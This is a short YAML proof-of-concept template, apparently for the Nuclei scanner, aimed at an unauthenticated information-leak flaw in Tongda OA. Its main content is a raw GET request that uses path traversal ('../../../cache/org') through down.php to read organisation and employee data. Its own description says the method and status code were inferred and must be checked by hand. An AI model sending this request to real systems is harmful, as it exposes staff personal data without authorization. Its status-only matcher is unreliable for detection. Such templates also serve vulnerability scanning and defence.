id: poc-200a83da80f9d756418d
info:
  name: 通达OAdown未授权员工信息泄露漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: info-leak,unauth,2025
http:
- raw:
  - 'GET /inc/package/down.php?id=../../../cache/org HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
